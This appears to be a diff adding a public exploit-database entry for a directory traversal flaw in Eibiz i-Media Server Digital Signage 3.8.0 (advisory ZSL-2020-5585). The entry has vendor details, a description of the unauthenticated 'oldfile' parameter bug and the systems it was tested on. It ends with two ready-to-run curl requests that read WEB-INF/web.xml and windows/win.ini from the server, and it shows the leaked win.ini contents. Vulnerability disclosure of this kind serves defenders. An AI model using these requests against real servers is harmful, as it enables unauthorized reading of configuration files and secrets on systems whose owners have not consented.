@@ -1,0 +1,56 @@
+# Exploit Title: Eibiz i-Media Server Digital Signage 3.8.0 - Directory Traversal
+# Date: 2020-08-22
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.eibiz.co.th
+# Affected version: <=3.8.0
+# CVE: N/A
+
+Eibiz i-Media Server Digital Signage 3.8.0 (oldfile) File Path Traversal
+
+
+Vendor: EIBIZ Co.,Ltd.
+Product web page: http://www.eibiz.co.th
+Affected version: <=3.8.0
+
+Summary: EIBIZ develop advertising platform for out of home media in that
+time the world called "Digital Signage". Because most business customers
+still need get outside to get in touch which products and services. Online
+media alone cannot serve them right place, right time.
+
+Desc: i-Media Server is affected by a directory traversal vulnerability. An
+unauthenticated remote attacker can exploit this to view the contents of
+files located outside of the server's root directory. The issue can be
+triggered through the 'oldfile' GET parametery.
+
+Tested on: Windows Server 2016
+           Windows Server 2012 R2
+           Windows Server 2008 R2           
+           Apache Flex
+           Apache Tomcat/6.0.14
+           Apache-Coyote/1.1
+           BlazeDS Application
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5585
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5585.php
+
+
+26.07.2020
+
+--
+
+
+$ curl "http://192.168.1.1/dlibrary/null?oldfile=../../WEB-INF/web.xml&library=null"
+
+$ curl "http://192.168.1.1/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null"
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
